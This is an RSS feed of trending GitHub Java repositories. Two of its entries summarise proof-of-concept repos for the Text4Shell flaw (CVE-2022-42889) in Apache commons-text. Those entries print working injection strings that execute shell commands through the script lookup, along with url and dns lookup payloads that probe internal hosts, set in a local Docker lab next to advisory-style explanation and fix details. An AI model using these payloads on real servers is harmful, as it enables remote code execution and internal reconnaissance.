<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Java Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-10-22T01:33:46Z</updated>
  <subtitle>Daily Trending of Java in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>karthikuj/cve-2022-42889-text4shell-docker</title>
    <updated>2022-10-22T01:33:46Z</updated>
    <id>tag:github.com,2022-10-22:/karthikuj/cve-2022-42889-text4shell-docker</id>
    <link href="https://github.com/karthikuj/cve-2022-42889-text4shell-docker" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Dockerized POC for CVE-2022-42889 Text4Shell&lt;/p&gt;&lt;hr&gt;&lt;h3&gt;Install maven - &lt;a href=&#34;https://www.digitalocean.com/community/tutorials/install-maven-linux-ubuntu&#34;&gt;maven-linux&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Maven install to create the fat jar&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;mvn clean install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;2&#34;&gt; &#xA; &lt;li&gt;Docker build&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker build --tag=text4shell .&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;3&#34;&gt; &#xA; &lt;li&gt;Docker run&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker run -p 80:8080 text4shell&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;4&#34;&gt; &#xA; &lt;li&gt;Test the app&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;http://localhost/text4shell/attack?search=&amp;lt;anything&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;5&#34;&gt; &#xA; &lt;li&gt;Attack can be performed by passing a string ‚Äú${prefix:name}‚Äù where the prefix is the aforementioned lookup:&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;${script:javascript:java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/foo&#39;)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D&#34;&gt;http://localhost/text4shell/attack?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ol start=&#34;6&#34;&gt; &#xA; &lt;li&gt; &lt;p&gt;You can also try using &lt;code&gt;dns&lt;/code&gt; or &lt;code&gt;url&lt;/code&gt; prefixes.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Get the container id&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker container ls&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;8&#34;&gt; &#xA; &lt;li&gt;Get into the app&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker exec -it &amp;lt;container_id&amp;gt; bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;9&#34;&gt; &#xA; &lt;li&gt;To check if above RCE was successful (You should see a file named &lt;code&gt;foo&lt;/code&gt; created in the &lt;code&gt;/tmp&lt;/code&gt; directory):&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;ls /tmp/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ol start=&#34;10&#34;&gt; &#xA; &lt;li&gt;To stop the container&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker container stop &amp;lt;container_id&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>killbill/killbill</title>
    <updated>2022-10-22T01:33:46Z</updated>
    <id>tag:github.com,2022-10-22:/killbill/killbill</id>
    <link href="https://github.com/killbill/killbill" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Open-Source Subscription Billing &amp; Payments Platform&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Kill Bill - Open-Source Subscription Billing &amp;amp; Payments Platform&lt;/h2&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img alt=&#34;Kill Bill logo&#34; src=&#34;https://github.com/killbill/killbill-docs/raw/v3/userguide/assets/img/logo.png&#34; style=&#34;max-width:100%;&#34;&gt; &lt;/p&gt; &#xA;&lt;p&gt;Kill Bill has been the leading Open-Source Subscription Billing &amp;amp; Payments Platform over the past 10 years. The platform exists to help you scale your billing and payment infrastructure and to grow your business. Out of the box, you have access to real-time analytics and financial reports. And because you are in control of your business and client data, you avoid any vendor lock-in.&lt;/p&gt; &#xA;&lt;p&gt;Kill Bill can fulfill the billing and payment needs of nearly any online business. Reliable and robust, it has proven itself over time with even the largest SaaS and e-commerce organizations.&lt;/p&gt; &#xA;&lt;h3&gt;Open-Source + SaaS billing = OpenSaaS billing&lt;/h3&gt; &#xA;&lt;p&gt;Kill Bill offers a lot out of the box:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can test various subscription billing models to see which is most profitable for your business.&lt;/li&gt; &#xA; &lt;li&gt;It is easy to run trials and accommodate even the briefest promotional discounts.&lt;/li&gt; &#xA; &lt;li&gt;Your business doesn&#39;t need to rely on the uptime or processing speed of a third-party SaaS provider.&lt;/li&gt; &#xA; &lt;li&gt;Kill Bill is not an all-in-one solution. Instead, it is highly modularized, enabling you to disable functionality you don&#39;t need or replace functionality with one of your existing systems.&lt;/li&gt; &#xA; &lt;li&gt;On premise or in the cloud, Kill Bill will scale as your subscription business grows. You can also start with Kill Bill in one business area and slowly migrate it to other areas.&lt;/li&gt; &#xA; &lt;li&gt;Kill Bill provides an unmatched framework for extensibility.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;With Kill Bill, you get a SaaS-like subscription management and billing solution out of the box, but with the flexibility and peace of mind of running an open-source stack.&lt;/p&gt; &#xA;&lt;h3&gt;Get your own subscription billing platform&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;You can get much more information on &lt;a href=&#34;http://killbill.io&#34;&gt;killbill.io&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;All of our technical documentation is available on &lt;a href=&#34;http://docs.killbill.io&#34;&gt;docs.killbill.io&lt;/a&gt; (sources in the &lt;a href=&#34;https://github.com/killbill/killbill-docs&#34;&gt;killbill/killbill-docs&lt;/a&gt; repository).&lt;/li&gt; &#xA; &lt;li&gt;Eager to get started? Deploy your own instance of Kill Bill on AWS using our &lt;a href=&#34;https://docs.killbill.io/latest/aws.html&#34;&gt;one-click deployer&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Head over to &lt;a href=&#34;https://cloud.killbill.io&#34;&gt;cloud.killbill.io&lt;/a&gt; for free hosted sandboxes, developer tools, and more.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Open-Source and governance&lt;/h3&gt; &#xA;&lt;p&gt;Kill Bill is free to use and completely open-source under the Apache Licence 2.0 license. üéâ&lt;/p&gt; &#xA;&lt;p&gt;However, we do require financial backing to sustain the effort to maintain and enhance the project. Companies, individual users, and contributors can join their peers in supporting the work through &lt;a href=&#34;https://github.com/sponsors/killbill&#34;&gt;GitHub Sponsors&lt;/a&gt;. üçª&lt;/p&gt; &#xA;&lt;h3&gt;Get stats on Kill Bill contributors&lt;/h3&gt; &#xA;&lt;p&gt;Looking for statistics? This project does not use a monolithic repository, but is instead split across many components. To gather accurate counts on contributors, stars, and forks, take a look across our entire &lt;a href=&#34;https://github.com/killbill&#34;&gt;GitHub organization&lt;/a&gt;. üìà&lt;/p&gt; &#xA;&lt;h3&gt;About Kill Bill&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.linkedin.com/pub/martin-westhead/1/75a/248&#34;&gt;Martin Westhead&lt;/a&gt;, &lt;a href=&#34;https://www.linkedin.com/in/pierrealexandremeyer&#34;&gt;Pierre-Alexandre Meyer&lt;/a&gt;, and &lt;a href=&#34;https://www.linkedin.com/in/stephanebrossier&#34;&gt;St√©phane Brossier&lt;/a&gt; founded the project independently in 2010. The Billing Project, LLC owns the Kill Bill codebase and trademarks. Professional services, sponsorships, and commercial support packages are available &lt;a href=&#34;https://killbill.io/contact-us/&#34;&gt;upon request&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>SeanWrightSec/CVE-2022-42889-PoC</title>
    <updated>2022-10-22T01:33:46Z</updated>
    <id>tag:github.com,2022-10-22:/SeanWrightSec/CVE-2022-42889-PoC</id>
    <link href="https://github.com/SeanWrightSec/CVE-2022-42889-PoC" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Proof of Concept for the Apache commons-text vulnerability CVE-2022-42889.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;CVE-2022-42889 PoC&lt;/h1&gt; &#xA;&lt;p&gt;This is Proof of Concept for the vulnerability &lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2022-42889&#34;&gt;CVE-2022-42889&lt;/a&gt;. This code will run the JavaScript code &lt;code&gt;195 + 324&lt;/code&gt;. If vulnerable the output should be:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;PoC Output: 519&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In order to run this you will need:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;JDK 11 or above&lt;/li&gt; &#xA; &lt;li&gt;Maven&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;When prompted for an exploit string, you can either provide your own exploit string (and hit Enter to enter the string), or simply hit Enter to use the default exploit string of &lt;code&gt;${script:javascript:195 + 324}&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h1&gt;Docker&lt;/h1&gt; &#xA;&lt;p&gt;Alternatively you can use Docker to be able to run this PoC:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;docker build -t poc .&#xA;docker run -it poc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;What&#39;s the Issue?&lt;/h1&gt; &#xA;&lt;p&gt;The issue stems from the fact that the following keys should not be interpolated by default (as per the documentation &lt;a href=&#34;https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html&#34;&gt;https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/lookup/StringLookupFactory.html&lt;/a&gt;):&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;script&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;dns&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;url&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;script&lt;/h2&gt; &#xA;&lt;p&gt;This lookup allows the supplied JavaScript code to be executed. The result is the ability for an attacker to be able to arbitary code on the system.&lt;/p&gt; &#xA;&lt;h4&gt;Format&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;${script:&amp;lt;engine&amp;gt;:&amp;lt;code&amp;gt;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Example&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;${script:javascript:java.lang.Runtime.getRuntime().exec(&#39;mkdir poc-test&#39;)}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example in PoC:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Enter your exploit string (press Enter to use the default of &#39;${script:javascript:195 + 324}&#39;): &#xA;${script:javascript:java.lang.Runtime.getRuntime().exec(&#34;mkdir poc-test&#34;)}&#xA;Warning: Nashorn engine is planned to be removed from a future JDK release&#xA;===================================================================================================================&#xA;Exploiting PoC with the exploit string &#39;${script:javascript:java.lang.Runtime.getRuntime().exec(&#34;mkdir poc-test&#34;)}&#39;&#xA;===================================================================================================================&#xA;PoC Output:&#xA;-------------------------------------------------------------------------------------------------------------------&#xA;Process[pid=67, exitValue=0]&#xA;===================================================================================================================&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;url&lt;/h2&gt; &#xA;&lt;p&gt;This lookup calls the specified url. An attacker could leverage this to be able to perform basic GET requests to internal resources.&lt;/p&gt; &#xA;&lt;h4&gt;Format&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;${url:&amp;lt;character-encoding&amp;gt;:&amp;lt;url&amp;gt;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Example&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;${url:UTF-8::https://internal-jenkins.companyx.net/}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example in PoC:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Enter your exploit string (press Enter to use the default of &#39;${script:javascript:195 + 324}&#39;): &#xA;${url:UTF-8:https://www.google.com/}&#xA;===================================================================================================================&#xA;Exploiting PoC with the exploit string &#39;${url:UTF-8:https://www.google.com/}&#39;&#xA;===================================================================================================================&#xA;PoC Output:&#xA;-------------------------------------------------------------------------------------------------------------------&#xA;&amp;lt;!doctype html&amp;gt;&amp;lt;html itemscope=&#34;&#34; itemtype=&#34;http://schema.org/WebPage&#34; lang=&#34;en-GB&#34;&amp;gt;&amp;lt;head&amp;gt;&#xA;....&#xA;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&#xA;===============================================================================================&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;dns&lt;/h2&gt; &#xA;&lt;p&gt;This lookup performs a DNS query, or a reverse lookup. This could allow an attacker to be able to identify internal resources.&lt;/p&gt; &#xA;&lt;h4&gt;Format&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;${dns:&amp;lt;address,canonical-name,name&amp;gt;|&amp;lt;host&amp;gt;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Example&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;${dns:address|internal-jenkins.companyx.net}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Example in PoC:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Enter your exploit string (press Enter to use the default of &#39;${script:javascript:195 + 324}&#39;): &#xA;${dns:address|www.google.com}                                                         &#xA;===================================================================================================================&#xA;Exploiting PoC with the exploit string &#39;${dns:address|www.google.com}&#39;&#xA;===================================================================================================================&#xA;PoC Output:&#xA;-------------------------------------------------------------------------------------------------------------------&#xA;142.250.200.4&#xA;===================================================================================================================&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;However due to a flaw in the logic, these 3 keys are interpolated by default, when they should not (since they could represent a security risk).&lt;/p&gt; &#xA;&lt;h1&gt;What&#39;s the Risk?&lt;/h1&gt; &#xA;&lt;p&gt;An attacker with control over the string passed into an affected &lt;code&gt;StringSubstitutor&lt;/code&gt; replace could allow the attacker to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Run JavaScript code on the system (typically a server) executing the &lt;code&gt;StringSubstitutor&lt;/code&gt; code&lt;/li&gt; &#xA; &lt;li&gt;Connect to other servers from the affected system&lt;/li&gt; &#xA; &lt;li&gt;Potentially gain access to other remote resources from the affected system&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Am I Vulnerable?&lt;/h1&gt; &#xA;&lt;p&gt;In order for your code to be vulnerable you need to:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;Be running a version of Apache &lt;code&gt;commons-text&lt;/code&gt; from version &lt;code&gt;1.5.0&lt;/code&gt; up to (and not including) &lt;code&gt;1.10.0&lt;/code&gt;&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Using Interpolation for your StringSubstituion (see &lt;a href=&#34;https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html&#34;&gt;https://commons.apache.org/proper/commons-text/apidocs/org/apache/commons/text/StringSubstitutor.html&lt;/a&gt;)&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;Note that in JDK 15 and later the JavaScript engine &lt;code&gt;Nashorn&lt;/code&gt; is no longer included. However, the &lt;code&gt;JEXL&lt;/code&gt; engine is still included and as a result &lt;a href=&#34;https://twitter.com/pwntester/status/1582321752566161409/photo/1&#34;&gt;RCE may still be possible&lt;/a&gt;.&lt;/p&gt; &lt;p&gt;(&lt;em&gt;kudos to &lt;a href=&#34;https://github.com/rgmz&#34;&gt;rgmz&lt;/a&gt; for &lt;a href=&#34;https://github.com/SeanWrightSec/CVE-2022-42889-PoC/issues/1&#34;&gt;highlighting&lt;/a&gt; this&lt;/em&gt;)&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;Official Fix&lt;/h1&gt; &#xA;&lt;p&gt;The fix for this is to update your instances of &lt;code&gt;commons-text&lt;/code&gt; to versions &lt;code&gt;1.10.0&lt;/code&gt; or later.&lt;/p&gt; &#xA;&lt;h1&gt;Note&lt;/h1&gt; &#xA;&lt;p&gt;The other default lookups could still potentially represent a security risk (such as the ability to read content of files, read system properies, etc). Use this feature with caution and make sure that all user input appropriately sanitised (for example passing through an allow list).&lt;/p&gt;</summary>
  </entry>
</feed>